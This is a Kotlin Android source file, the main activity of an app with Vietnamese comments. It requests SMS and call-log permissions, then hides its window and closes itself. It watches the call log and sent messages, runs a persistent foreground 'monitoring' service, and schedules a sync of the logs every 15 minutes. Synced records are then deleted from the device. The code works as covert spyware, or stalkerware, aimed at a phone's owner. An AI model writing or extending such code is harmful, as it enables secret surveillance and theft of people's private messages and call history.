package com.example.mobileapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Telephony
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.work.*
import com.example.mobileapp.db.DataCleanupManager
import com.example.mobileapp.observer.CallLogObserver
import com.example.mobileapp.observer.SmsObserver
import com.example.mobileapp.service.ForegroundMonitorService
import com.example.mobileapp.util.SmsHelper
import com.example.mobileapp.worker.SyncWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var callLogObserver: CallLogObserver
    private lateinit var smsObserver: SmsObserver
    private var monitoringActive = false

    // Cấu hình lưu trữ dữ liệu
    private val dataRetentionConfig = DataRetentionConfig(
        maxRecords = 500,          // Giữ tối đa 500 bản ghi
        retentionDays = 7,         // Giữ dữ liệu tối đa 7 ngày
        cleanupIntervalHours = 6,  // Dọn dẹp 6 giờ một lần
        deleteOnlySynced = true    // Chỉ xóa dữ liệu đã đồng bộ
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Bắt đầu kiểm tra quyền ngay lập tức
        checkAndRequestPermissions()
        
        // Ẩn cửa sổ ứng dụng
        moveTaskToBack(true)
        
        // Đóng Activity nếu quyền đã được cấp
        if (checkPermissionsGranted()) {
            finish()
        }
    }
    
    private fun checkPermissionsGranted(): Boolean {
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG
        )
        
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun checkAndRequestPermissions() {
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG
        )

        val deniedPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (deniedPermissions.isEmpty()) {
            startMonitoring()
            finish() // Đóng Activity ngay sau khi bắt đầu giám sát
        } else {
            // Request permissions programmatically
            requestPermissions(requiredPermissions, 100)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == 100) {
            val granted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (granted) {
                startMonitoring()
            }
            finish() // Đóng Activity trong mọi trường hợp
        }
    }

    private fun startMonitoring() {
        registerObservers()
        startForegroundService()
        startWorkManager()
        setupDataCleanup()
        
        // Đăng ký monitor cho SMS gửi đi
        SmsHelper.registerSentSmsMonitoring(applicationContext)
        
        monitoringActive = true
    }

    private fun registerObservers() {
        // Đăng ký CallLogObserver
        if (!this::callLogObserver.isInitialized) {
            callLogObserver = CallLogObserver(this, Handler(Looper.getMainLooper()))
            contentResolver.registerContentObserver(
                android.provider.CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver
            )
        }
        
        // Đăng ký SmsObserver
        if (!this::smsObserver.isInitialized) {
            smsObserver = SmsObserver(this, Handler(Looper.getMainLooper()))
            contentResolver.registerContentObserver(
                Uri.parse("content://sms/sent"),
                true,
                smsObserver
            )
        }
    }

    private fun startForegroundService() {
        val serviceIntent = Intent(this, ForegroundMonitorService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun startWorkManager() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val request = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "syncLogs",
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
    }
    
    private fun setupDataCleanup() {
        val cleanupManager = DataCleanupManager(applicationContext)
        
        // Thực hiện dọn dẹp ngay một lần
        cleanupManager.cleanupNow(
            maxRecords = dataRetentionConfig.maxRecords,
            retentionDays = dataRetentionConfig.retentionDays,
            onlySynced = dataRetentionConfig.deleteOnlySynced
        )
        
        // Lập lịch dọn dẹp định kỳ
        cleanupManager.schedulePeriodicCleanup(
            intervalHours = dataRetentionConfig.cleanupIntervalHours,
            maxRecords = dataRetentionConfig.maxRecords,
            retentionDays = dataRetentionConfig.retentionDays,
            onlySynced = dataRetentionConfig.deleteOnlySynced
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        if (this::callLogObserver.isInitialized && !monitoringActive) {
            contentResolver.unregisterContentObserver(callLogObserver)
        }
        if (this::smsObserver.isInitialized && !monitoringActive) {
            contentResolver.unregisterContentObserver(smsObserver)
        }
    }
    
    /**
     * Lớp cấu hình giới hạn dữ liệu
     */
    data class DataRetentionConfig(
        val maxRecords: Int,           // Số lượng bản ghi tối đa lưu trữ
        val retentionDays: Int,        // Số ngày lưu trữ dữ liệu
        val cleanupIntervalHours: Int, // Khoảng thời gian giữa các lần dọn dẹp
        val deleteOnlySynced: Boolean  // Chỉ xóa dữ liệu đã đồng bộ
    )
}
